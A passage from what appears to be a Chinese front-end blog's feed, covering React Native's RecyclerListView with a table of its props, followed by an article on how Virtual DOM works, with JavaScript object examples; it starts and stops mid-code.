keyword">this</span><span class="token punctuation">.</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>RecyclerListView                layoutProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_layoutProvider<span class="token punctuation">}</span>                dataProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>dataProvider<span class="token punctuation">.</span><span class="token function">cloneWithRows</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>infoList<span class="token punctuation">)</span><span class="token punctuation">}</span>                rowRenderer<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_rowRenderer<span class="token punctuation">}</span>                extendedState<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">}</span>                onEndReached<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_onLoadMore<span class="token punctuation">}</span>                onEndReachedThreshold<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">50</span><span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// renderFooter={this._renderFooter}</span>                scrollViewProps<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>                    refreshControl<span class="token punctuation">:</span> <span class="token punctuation">(</span>                        <span class="token operator">&lt;</span>refreshcontrol refreshing<span class="token operator">=</span><span class="token string">"{this.state.loading}"</span> onrefresh<span class="token operator">=</span><span class="token string">"{async"</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">{</span>                                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> loading<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment" spellcheck="true">// analytics.logEvent("Event_Stagg_pull_to_refresh");</span>                                <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> loading<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span><span class="token punctuation">}</span>                        <span class="token operator">/</span><span class="token operator">></span>                    <span class="token punctuation">)</span>                <span class="token punctuation">}</span><span class="token punctuation">}</span>            <span class="token operator">/</span><span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>refreshcontrol<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果图：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/list1.png" alt></p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/list2.png" alt></p><h3 id="RecyclerListView所有属性"><a href="#RecyclerListView所有属性" class="headerlink" title="RecyclerListView所有属性"></a>RecyclerListView所有属性</h3><table><thead><tr><th>Prop</th><th>Required</th><th>Params Type</th><th>Description</th></tr></thead><tbody><tr><td>layoutProvider</td><td>Yes</td><td>BaseLayoutProvider</td><td>Constructor function that defines the layout (height / width) of each element</td></tr><tr><td>dataProvider</td><td>Yes</td><td>DataProvider</td><td>构造函数，定义列表数据</td></tr><tr><td>contextProvider</td><td>No</td><td>ContextProvider</td><td>用于在视图被破坏的情况下保持滚动位置，这通常在后退导航时发生</td></tr><tr><td>rowRenderer</td><td>Yes</td><td>(type: string | number, data: any, index: number) =&gt; JSX.Element | JSX.Element[] | null</td><td>渲染列表视图</td></tr><tr><td>initialOffset</td><td>No</td><td>number</td><td>要从中开始渲染的初始偏移量; 如果您想跨页面滚动上下文，这非常有用。</td></tr><tr><td>renderAheadOffset</td><td>No</td><td>number</td><td>指定要呈现视图的提前像素数。 增加此值有助于减少空白；但是要尽可能的填写较低的数字，较高的值会增加重新渲染的计算</td></tr><tr><td>isHorizontal</td><td>No</td><td>boolean</td><td>true水平布局，默认垂直布局</td></tr><tr><td>onScroll</td><td>No</td><td>rawEvent: ScrollEvent, offsetX: number, offsetY: number) =&gt; void</td><td>列表滚动时触发</td></tr><tr><td>onRecreate</td><td>No</td><td>(params: OnRecreateParams) =&gt; void</td><td>回收视图是执行</td></tr><tr><td>externalScrollView</td><td>No</td><td>{ new (props: ScrollViewDefaultProps): BaseScrollView }</td><td>Use this to pass your on implementation of BaseScrollView</td></tr><tr><td>onEndReached</td><td>No</td><td>() =&gt; void</td><td>列表触底是执行</td></tr><tr><td>onEndReachedThreshold</td><td>No</td><td>number</td><td>列表距离底部多大距离时触发onEndReached的回调，填写具体像素值</td></tr><tr><td>onVisibleIndexesChanged</td><td>No</td><td>TOnItemStatusChanged</td><td>可见元素，滚动时实时触发</td></tr><tr><td>renderFooter</td><td>No</td><td>() =&gt; JSX.Element | JSX.Element[] | null</td><td>Provide this method if you want to render a footer. Helpful in showing a loader while doing incremental loads</td></tr><tr><td>initialRenderIndex</td><td>No</td><td>number</td><td>指定渲染开始的item index如果同时设置了initialOffset优先执行initialOffset</td></tr><tr><td>scrollThrottle</td><td>No</td><td>number</td><td>iOS特有</td></tr><tr><td>canChangeSize</td><td>No</td><td>boolean</td><td>Specify if size can change</td></tr><tr><td>distanceFromWindow</td><td>No</td><td>number</td><td>Web only; Specify how far away the first list item is from window top</td></tr><tr><td>useWindowScroll</td><td>No</td><td>boolean</td><td>Web only; Layout Elements in window instead of a scrollable div</td></tr><tr><td>disableRecycling</td><td>No</td><td>boolean</td><td>Turns off recycling</td></tr><tr><td>forceNonDeterministicRendering</td><td>No</td><td>boolean</td><td>Default is false; if enabled dimensions provided in layout provider will not be strictly enforced. Use this if item dimensions cannot be accurately determined</td></tr><tr><td>extendedState</td><td>No</td><td>object</td><td>在更新目前列表渲染以外的数据时，可以使用此属性更新状态，以便绘制出新的列表，并且不再重新渲染以前的列表数据</td></tr><tr><td>itemAnimator</td><td>No</td><td>ItemAnimator</td><td>Enables animating RecyclerListView item cells (shift, add, remove, etc)</td></tr><tr><td>optimizeForInsertDeleteAnimations</td><td>No</td><td>boolean</td><td>Enables you to utilize layout animations better by unmounting removed items</td></tr><tr><td>style</td><td>No</td><td>object</td><td>To pass down style to inner ScrollView</td></tr><tr><td>scrollViewProps</td><td>No</td><td>object</td><td>For all props that need to be proxied to inner/external scrollview. Put them in an object and they’ll be spread and passed down.</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> ReactNative </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端Virtual DOM详解</title>
      <link href="2019/03/04/Virtual/"/>
      <url>2019/03/04/Virtual/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前最流行的两大前端框架，React和Vue，都不约而同的借助Virtual DOM技术提高页面的渲染效率。那么，什么是Virtual DOM？它是通过什么方式去提升页面渲染效率的呢？</p><h2 id="什么是Virtual-DOM"><a href="#什么是Virtual-DOM" class="headerlink" title="什么是Virtual DOM"></a>什么是Virtual DOM</h2><p>本质上来说，Virtual DOM只是一个简单的JS对象，并且最少包含tag、props和children三个属性。不同的框架对这三个属性的命名会有点差别，但表达的意思是一致的。它们分别是标签名（tag）、属性（props）和子元素对象（children）。下面是一个典型的Virtual DOM对象例子</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>    tag<span class="token punctuation">:</span> <span class="token string">"div"</span><span class="token punctuation">,</span>    props<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    children<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token string">"Hello World"</span><span class="token punctuation">,</span>         <span class="token punctuation">{</span>            tag<span class="token punctuation">:</span> <span class="token string">"ul"</span><span class="token punctuation">,</span>            props<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            children<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>                tag<span class="token punctuation">:</span> <span class="token string">"li"</span><span class="token punctuation">,</span>                props<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    id<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                    <span class="token keyword">class</span><span class="token punctuation">:</span> <span class="token string">"li-1"</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                children<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"第"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>            <span class="token punctuation">}</span><span class="token punctuation">]</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Virtual DOM跟dom对象有一一对应的关系，上面的Virtual DOM是由以下的HTML生成的</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>div<span class="token operator">></span>    Hello World    <span class="token operator">&lt;</span>ul<span class="token operator">></span>        <span class="token operator">&lt;</span>li id<span class="token operator">=</span><span class="token string">"1"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"li-1"</span><span class="token operator">></span>            第<span class="token number">1</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个dom对象，比如<code>li</code>，由<code>tag(li)</code>, <code>props({id: 1, class: &quot;li-1&quot;})</code>和<code>children([&quot;第&quot;, 1])</code>三个属性来描述。</p><h2 id="前端技术框架发展"><a href="#前端技术框架发展" class="headerlink" title="前端技术框架发展"></a>前端技术框架发展</h2><h3 id="菜鸟的日常操作"><a href="#菜鸟的日常操作" class="headerlink" title="菜鸟的日常操作"></a>菜鸟的日常操作</h3><p>假如现在你需要写一个像下面一样的表格的应用程序，这个表格可以根据不同的字段进行升序或者降序的展示。</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/table.png" alt="table.png"></p><p>这个应用程序看起来很简单，你可以想出好几种不同的方式来写。最容易想到的可能是，在你的 JavaScript 代码里面存储这样的数据：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> sortKey <span class="token operator">=</span> <span class="token string">"name"</span> <span class="token comment" spellcheck="true">// 排序的字段，名字（name）、年龄（age）、地址（address）</span><span class="token keyword">var</span> sortType <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">// 升序还是逆序</span><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// 表格数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用三个变量分别存储当前排序的字段、排序方向、还有表格数据；</p><p>然后给表格头部加点击事件，当用户点击排序字段时，会根据上面几个变量存储的值来对内容进行排序；</p><p>然后用 JS 操作 DOM，更新页面的排序状态和表格内容。</p><h3 id="这样做的后果是？"><a href="#这样做的后果是？" class="headerlink" title="这样做的后果是？"></a>这样做的后果是？</h3><p>随着应用程序越来越复杂，需要在JS里面维护的字段也越来越多，需要监听事件和在事件回调用更新页面的DOM操作也越来越多，应用程序会变得非常难维护。</p><h3 id="寻求突破变更？"><a href="#寻求突破变更？" class="headerlink" title="寻求突破变更？"></a>寻求突破变更？</h3><p>后来大牛们使用了 MVC、MVP 的架构模式，希望能从代码组织方式来降低维护这种复杂应用程序的难度；但是 MVC 架构没办法减少你所维护的状态，也没有降低状态更新你需要对页面的更新操作（前端来说就是DOM操作），你需要操作的DOM还是需要操作（他大舅他二舅都是他舅），只是换了个地方。</p><h3 id="思想的革命、技术的突破"><a href="#思想的革命、技术的突破" class="headerlink" title="思想的革命、技术的突破"></a>思想的革命、技术的突破</h3><p>既然前辈大牛们已经实现了状态改变DOM，为什么我们不近一步，做出那么一个东西可以让视图和状态进行</p><p>绑定？</p><p>让状态变更视图自动跟着变更，就不用手动更新页面了。</p><p>这就是后来的 MVVM模式</p><p>只要在模版中声明视图组件是和什么状态进行绑定的，双向绑定引擎就会在状态</p><p>更新的时候自动更新视图，MVVM 可以能很好的降低维护状态以及减少视图的复杂程度</p><h3 id="思维的发散、Virtual-DOM的诞生"><a href="#思维的发散、Virtual-DOM的诞生" class="headerlink" title="思维的发散、Virtual DOM的诞生"></a>思维的发散、Virtual DOM的诞生</h3><p>还有一个非常直观的方法，可以大大降低视图更新的操作。一旦状</p><p>态发生了变化，就用模版引擎重新渲染整个视图，然后用新的视图更换掉旧的视图。就</p><p>像上面的表格，当用户点击的时，还是在 JS 里面更新状态，但是页面更新就不用手动</p><p>操作 DOM 了，直接把整个表格用模版引擎重新渲染一遍，然后设置一下 innerHTML 。</p><p>那么这个方法会有个很大的问题，会导致 DOM 操作变慢，因为任何的状态变更都要重</p><p>新构造整个 DOM，性价比很低。对于局部的小视图的更新，这样没有问题（backbone</p><p>就是这么干的）。但对于大型视图，需要更新页面较多局部视图时，这样的做法就非常不</p><p>可取。</p><p>Virtual DOM 也是这么做的，只是加了一些步骤来避免了整棵 DOM 树变更。上面提供</p><p>的几种方法，其实都在解决同一个问题，那就是维护状态更新视图。如果我们能够很好来</p><p>应对这个问题，就降低复杂性。</p><h2 id="Virtual-DOM-算法"><a href="#Virtual-DOM-算法" class="headerlink" title="Virtual DOM 算法"></a>Virtual DOM 算法</h2><h3 id="DOM解析流程"><a href="#DOM解析流程" class="headerlink" title="DOM解析流程"></a>DOM解析流程</h3><p>DOM 很慢，为啥说它慢，先看一下 Webkit 引擎，所有浏览器都遵循类似的工作流，只</p><p>是在细节处理有些不同。</p><ul><li><p>一旦浏览器接收到一个 HTML 文件，渲染引擎 Render Engine就开始解析它，根据 HTML 元素 Elements 对应地生成 DOM 节点 Nodes，最终组成一棵 DOM 树。</p></li><li><p>构造了渲染树以后，浏览器引擎开始着手布局 Layout。</p></li><li><p>布局时，渲染树上的每个节点根据其在屏幕上应该出现的精确位置，分配一组屏幕坐标值。</p></li><li><p>接着，浏览器将会通过遍历渲染树，调用每个节点的 Paint 方法来绘制这些 Render 对象。</p></li><li><p>Paint 方法根据浏览器平台，使用不同的 UI后端 API（Agnostic UI Backend API）通过绘制，最终将在屏幕上展示内容。</p></li></ul><p>渲染流程图如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/vdom.png" alt="vdom.png"></p><h3 id="那么问题来了"><a href="#那么问题来了" class="headerlink" title="那么问题来了"></a>那么问题来了</h3><p>只要在这过程中进行一次 DOM 更新，整个渲染流程都会重做一遍。</p><h3 id="div的属性包含以下这些"><a href="#div的属性包含以下这些" class="headerlink" title="div的属性包含以下这些"></a>div的属性包含以下这些</h3><pre class="line-numbers language-js"><code class="language-js">align<span class="token punctuation">,</span> onwaiting<span class="token punctuation">,</span> onvolumechange<span class="token punctuation">,</span> ontimeupdate<span class="token punctuation">,</span> onsuspend<span class="token punctuation">,</span> onsubmit<span class="token punctuation">,</span>onstalled<span class="token punctuation">,</span> onshow<span class="token punctuation">,</span> onselect<span class="token punctuation">,</span> onseeking<span class="token punctuation">,</span> onseeked<span class="token punctuation">,</span> onscroll<span class="token punctuation">,</span> onresize<span class="token punctuation">,</span>onreset<span class="token punctuation">,</span> onratechange<span class="token punctuation">,</span> onprogress<span class="token punctuation">,</span> onplaying<span class="token punctuation">,</span> onplay<span class="token punctuation">,</span> onpause<span class="token punctuation">,</span>onmousewheel<span class="token punctuation">,</span> onmouseup<span class="token punctuation">,</span> onmouseover<span class="token punctuation">,</span> onmouseout<span class="token punctuation">,</span> onmousemove<span class="token punctuation">,</span>onmouseleave<span class="token punctuation">,</span> onmouseenter<span class="token punctuation">,</span> onmousedown<span class="token punctuation">,</span> onloadstart<span class="token punctuation">,</span>onloadedmetadata<span class="token punctuation">,</span> onloadeddata<span class="token punctuation">,</span> onload<span class="token punctuation">,</span> onkeyup<span class="token punctuation">,</span> onkeypress<span class="token punctuation">,</span>onkeydown<span class="token punctuation">,</span> oninvalid<span class="token punctuation">,</span> oninput<span class="token punctuation">,</span> onfocus<span class="token punctuation">,</span> onerror<span class="token punctuation">,</span> onended<span class="token punctuation">,</span> onemptied<span class="token punctuation">,</span>ondurationchange<span class="token punctuation">,</span> ondrop<span class="token punctuation">,</span> ondragstart<span class="token punctuation">,</span> ondragover<span class="token punctuation">,</span> ondragleave<span class="token punctuation">,</span>ondragenter<span class="token punctuation">,</span> ondragend<span class="token punctuation">,</span> ondrag<span class="token punctuation">,</span> ondblclick<span class="token punctuation">,</span> oncuechange<span class="token punctuation">,</span>oncontextmenu<span class="token punctuation">,</span> onclose<span class="token punctuation">,</span> onclick<span class="token punctuation">,</span> onchange<span class="token punctuation">,</span> oncanplaythrough<span class="token punctuation">,</span>oncanplay<span class="token punctuation">,</span> oncancel<span class="token punctuation">,</span> onblur<span class="token punctuation">,</span> onabort<span class="token punctuation">,</span> spellcheck<span class="token punctuation">,</span> isContentEditable<span class="token punctuation">,</span>contentEditable<span class="token punctuation">,</span> outerText<span class="token punctuation">,</span> innerText<span class="token punctuation">,</span> accessKey<span class="token punctuation">,</span> hidden<span class="token punctuation">,</span>webkitdropzone<span class="token punctuation">,</span> draggable<span class="token punctuation">,</span> tabIndex<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> translate<span class="token punctuation">,</span> lang<span class="token punctuation">,</span> title<span class="token punctuation">,</span>childElementCount<span class="token punctuation">,</span> lastElementChild<span class="token punctuation">,</span> firstElementChild<span class="token punctuation">,</span> children<span class="token punctuation">,</span>nextElementSibling<span class="token punctuation">,</span> previousElementSibling<span class="token punctuation">,</span> onwheel<span class="token punctuation">,</span>onwebkitfullscreenerror<span class="token punctuation">,</span> onwebkitfullscreenchange<span class="token punctuation">,</span> onselectstart<span class="token punctuation">,</span>onsearch<span class="token punctuation">,</span> onpaste<span class="token punctuation">,</span> oncut<span class="token punctuation">,</span> oncopy<span class="token punctuation">,</span> onbeforepaste<span class="token punctuation">,</span> onbeforecut<span class="token punctuation">,</span>onbeforecopy<span class="token punctuation">,</span> webkitShadowRoot<span class="token punctuation">,</span> dataset<span class="token punctuation">,</span> classList<span class="token punctuation">,</span> className<span class="token punctuation">,</span>outerHTML<span class="token punctuation">,</span> innerHTML<span class="token punctuation">,</span> scrollHeight<span class="token punctuation">,</span> scrollWidth<span class="token punctuation">,</span> scrollTop<span class="token punctuation">,</span>scrollLeft<span class="token punctuation">,</span> clientHeight<span class="token punctuation">,</span> clientWidth<span class="token punctuation">,</span> clientTop<span class="token punctuation">,</span> clientLeft<span class="token punctuation">,</span>offsetParent<span class="token punctuation">,</span> offsetHeight<span class="token punctuation">,</span> offsetWidth<span class="token punctuation">,</span> offsetTop<span class="token punctuation">,</span> offsetLeft<span class="token punctuation">,</span>localName<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> namespaceURI<span class="token punctuation">,</span> id<span class="token punctuation">,</span> style<span class="token punctuation">,</span> attributes<span class="token punctuation">,</span> tagName<span class="token punctuation">,</span>parentElement<span class="token punctuation">,</span> textContent<span class="token punctuation">,</span> baseURI<span class="token punctuation">,</span> ownerDocument<span class="token punctuation">,</span> nextSibling<span class="token punctuation">,</span>previousSibling<span class="token punctuation">,</span> lastChild<span class="token punctuation">,</span> firstChild<span class="token punctuation">,</span> childNodes<span class="token punctuation">,</span> parentNode<span class="token punctuation">,</span>nodeType<span class="token punctuation">,</span> nodeValue<span class="token punctuation">,</span> nodeName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来看看空的 div 元素有多少属性要实现，这还只是第一层的自有属性，没包括原型链继承而来</p><p>的。如果触发了页面事件，就就会导致页面重排。相对于 DOM 对象，原生的 JavaScript 处理</p><p>起来才会更快且更简单。</p><h3 id="DOM树"><a href="#DOM树" class="headerlink" title="DOM树"></a>DOM树</h3><p>DOM 树上的结构、属性信息我们都可以很容易地用 JavaScript 对象表示出来。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> olE <span class="token operator">=</span> <span class="token punctuation">{</span>  tagName<span class="token punctuation">:</span> <span class="token string">'ol'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 标签名</span>  props<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 属性用对象存储键值对</span>    id<span class="token punctuation">:</span> <span class="token string">'ol-list'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  children<span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token comment" spellcheck="true">// 子节点</span>    <span class="token punctuation">{</span>tagName<span class="token punctuation">:</span> <span class="token string">'li'</span><span class="token punctuation">,</span> props<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token keyword">class</span><span class="token punctuation">:</span> <span class="token string">'item'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"Item 1"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>tagName<span class="token punctuation">:</span> <span class="token string">'li'</span><span class="token punctuation">,</span> props<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token keyword">class</span><span class="token punctuation">:</span> <span class="token string">'item'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"Item 2"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>tagName<span class="token punctuation">:</span> <span class="token string">'li'</span><span class="token punctuation">,</span> props<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token keyword">class</span><span class="token punctuation">:</span> <span class="token string">'item'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"Item 3"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应HTML</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>ol id<span class="token operator">=</span><span class="token string">'ol-list'</span><span class="token operator">></span>  <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'item'</span><span class="token operator">></span>Item <span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>  <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'item'</span><span class="token operator">></span>Item <span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>  <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'item'</span><span class="token operator">></span>Item <span class="token number">3</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ol<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="虚拟DOM算法的原理"><a href="#虚拟DOM算法的原理" class="headerlink" title="虚拟DOM算法的原理"></a>虚拟DOM算法的原理</h3><p>DOM 我们都可以用 JavaScript 对象来表示。那反过来，就可以用 JavaScript 对象表示的树结</p><p>构来构建一个真正的 DOM 。当状态变更时，重新渲染这个 JavaScript 的对象结构，实现视图</p><p>的变更，结构根据变更的地方重新渲染。</p><p>这就是所谓的 Virtual DOM 算法：</p><ul><li>用 JavaScript 对象结构表示 DOM 树的结构；</li><li>然后用这个树构建一个真正的 DOM 树</li><li>插到文档当中当状态变更时，重新构造一棵新的对象树。</li><li>然后用新的树和旧的树进行比较两个数的差异。</li><li>然后把差异更新到久的树上，整个视图就更新了。</li></ul><p>Virtual DOM 本质就是在 JS 和 DOM 之间做了一个缓存。既然已经知道 DOM 慢，就在 JS 和 DOM 之间加个缓存。JS 先操作 Virtual DOM对比排序/变更，最后再把整个变更写入真实 DOM。</p><h2 id="Virtual-DOM实现"><a href="#Virtual-DOM实现" class="headerlink" title="Virtual DOM实现"></a>Virtual DOM实现</h2><h3 id="用JS对象模拟DOM树"><a href="#用JS对象模拟DOM树" class="headerlink" title="用JS对象模拟DOM树"></a>用JS对象模拟DOM树</h3><p>用 JavaScript 来表示一个 DOM 节点是很简单的事情，你只需要记录它的节点类型、属性，还有子节点：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> Ele <span class="token operator">=</span> <span class="token punctuation">(</span>tagName<span class="token punctuation">,</span> props<span class="token punctuation">,</span> children<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>tagName <span class="token operator">=</span> tagName  <span class="token keyword">this</span><span class="token punctuation">.</span>props <span class="token operator">=</span> props  <span class="token keyword">this</span><span class="token punctuation">.</span>children <span class="token operator">=</span> children<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例如上面的 DOM 结构就可以简单的表示：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> el <span class="token keyword">from</span> <span class="token string">'Ele'</span><span class="token punctuation">;</span><span class="token keyword">var</span> ol <span class="token operator">=</span> <span class="token function">el</span><span class="token punctuation">(</span><span class="token string">'ol'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>id<span class="token punctuation">:</span> <span class="token string">'ol-list'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>  <span class="token function">el</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token keyword">class</span><span class="token punctuation">:</span> <span class="token string">'item'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'Item 1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">el</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token keyword">class</span><span class="token punctuation">:</span> <span class="token string">'item'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'Item 2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">el</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">,</span> <span 